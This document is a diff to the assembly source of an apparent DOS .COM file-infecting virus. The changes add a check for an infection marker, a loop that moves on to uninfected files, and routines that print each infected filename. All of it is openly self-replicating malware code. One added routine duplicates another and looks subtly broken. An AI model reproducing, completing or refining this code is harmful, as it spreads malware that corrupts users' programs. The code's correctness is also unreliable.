@@ -34,24 +34,18 @@ code:
     mov ah, 4eh
     int 21h
 
+file_open:
+
     ; opening file (file descriptor -> ax)
     lea dx, [bp + file.fname]
     mov ax, 3D02h
     int 21h
     mov bx, ax ; file descriptor (ax) -> bx
+    jnc file_err_skip
 
-    ; output infected filename
-    mov al, '$'
-    mov file.fname[12], al
-    push dx
-    lea dx, [bp + file.fname]
-    mov ah, 09h
-    int 21h
-    pop dx
-    mov [bp + file.fname[12]], 0
+file_err:
 
     ; file error handling
-    jnc file_err_skip
     lea dx, [bp + file_err_msg]
     mov ah, 09h
     int 21h
@@ -61,7 +55,7 @@ code:
 
 file_err_skip:
 
-    mov ax, file.ftime
+    ; mov ax, file.ftime
 
     ; moving carret to the end to get the payload offset
     mov cx, 0
@@ -86,12 +80,45 @@ file_err_skip:
     mov ax, 4200h
     int 21h
 
-    ; reading first 4 bytes:
+    ; reading first 4 bytes
     mov cx, 4
     lea dx, [bp + leading_bytes]
     mov ah, 3fh
     int 21h
-    
+
+    ; cheking the infection flag
+    cmp [bp + leading_bytes + 3], 0ffh
+    jnz find_next_skip
+
+find_next:
+
+    ; finding next file
+    mov ah, 3eh
+    int 21h
+    mov ah, 4fh
+    int 21h
+    jc file_err
+    jmp file_open
+
+find_next_skip:
+
+    ; ; old output infected filename
+    ; mov al, '$'
+    ; mov file.fname[12], al
+    ; push dx
+    ; lea dx, [bp + file.fname]
+    ; mov ah, 09h
+    ; int 21h
+    ; pop dx
+    ; mov [bp + file.fname[12]], 0
+
+    ; output infected filename
+    lea dx, [bp + file.fname]
+    call str_f2c
+    mov ah, 09h
+    int 21h
+    call str_c2f
+
     ; moving carret to the start
     mov cx, 0
     mov dx, 0
@@ -104,7 +131,7 @@ file_err_skip:
     mov cx, 1
     mov ah, 40h
     int 21h
-    
+
     mov ax, [bp + jmp_length] ; jmp offset
     sub ax, 3 ; jmp command size
     ; add ax, 100h ; com header
@@ -113,7 +140,7 @@ file_err_skip:
     mov cx, 2
     mov ah, 40h
     int 21h
-    
+
     mov [bp + byte_buffer], 0ffh
     lea dx, [bp + byte_buffer]
     mov cx, 1
@@ -132,7 +159,7 @@ file_err_skip:
     mov cx, 1
     mov ah, 40h
     int 21h
-    
+
     mov ax, [bp + victim_bp]
     mov [bp + word_buffer], ax
     lea dx, [bp + word_buffer]
@@ -177,6 +204,50 @@ file_err_skip:
     mov ax, 100h
     jmp ax
 
+procedures:
+
+    str_f2c proc
+        push cx
+        push bx
+        mov cx, 13
+        str_f2c_lp:
+        mov bx, bp
+        add bx, dx
+        add bx, 13
+        sub bx, cx
+        cmp byte ptr[bx], 0
+        jz str_f2c_ch
+        loop str_f2c_lp
+        str_f2c_popret:
+        pop bx
+        pop cx
+        ret
+        str_f2c_ch:
+        mov [bx], '$'
+        jmp str_f2c_popret
+    str_f2c endp
+
+    str_c2f proc
+        push cx
+        push bx
+        mov cx, 13
+        str_c2f_lp:
+        mov bx, bp
+        add bx, dx
+        add bx, 13
+        sub bx, cx
+        cmp byte ptr[bx], 0
+        jz str_c2f_ch
+        loop str_c2f_lp
+        str_c2f_popret:
+        pop bx
+        pop cx
+        ret
+        str_c2f_ch:
+        mov [bx], '$'
+        jmp str_c2f_popret
+    str_c2f endp
+
 harddata:
 
     leading_bytes db 0b4h, 4ch, 0cdh, 21h
@@ -205,7 +276,6 @@ data:
     filename Str13 <>
     file DTAFileInfo <>
 
-    data_local_addr dw ?
     dword_buffer dd ?
     word_buffer dw ?
     byte_buffer db ?
@@ -215,7 +285,7 @@ data:
     jmp_length dw ?
     
     file_mask db '*.com*', 0
-    file_err_msg db 'No any file to infect', 13, 10, '$'
+    file_err_msg db 'No any other files to infect', 13, 10, '$'
 
 afterall:
 
